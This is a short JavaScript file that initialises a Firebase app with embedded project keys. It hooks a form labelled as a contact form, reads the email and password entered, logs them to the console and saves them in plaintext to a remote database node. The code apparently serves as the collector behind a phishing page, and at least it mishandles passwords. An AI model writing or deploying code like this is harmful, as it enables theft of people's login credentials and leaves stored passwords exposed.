// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyB7Y9fiBMPOV50Ammb72AsHRze8v36tRXM",
    authDomain: "mydata-9e67f.firebaseapp.com",
    databaseURL: "https://mydata-9e67f-default-rtdb.firebaseio.com/",
    projectId: "mydata-9e67f",
    storageBucket: "mydata-9e67f.appspot.com",
    messagingSenderId: "93135799043",
    appId: "1:93135799043:web:140cc2abea5f4b47fd1f36",
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  // Refernece contactInfo collections
  let contactInfo = firebase.database().ref("infos");
  
  // Listen for a submit
  document.querySelector(".contact-form").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    //   Get input Values
    let email = document.querySelector(".email").value;
    let password = document.querySelector(".password").value;
    console.log(email, password);
  
    saveContactInfo(email, password);
  
    document.querySelector(".contact-form").reset();

}

// Save infos to Firebase
function saveContactInfo(email, password) {
  let newContactInfo = contactInfo.push();

  newContactInfo.set({
    email: email,
    password: password,
  });
}

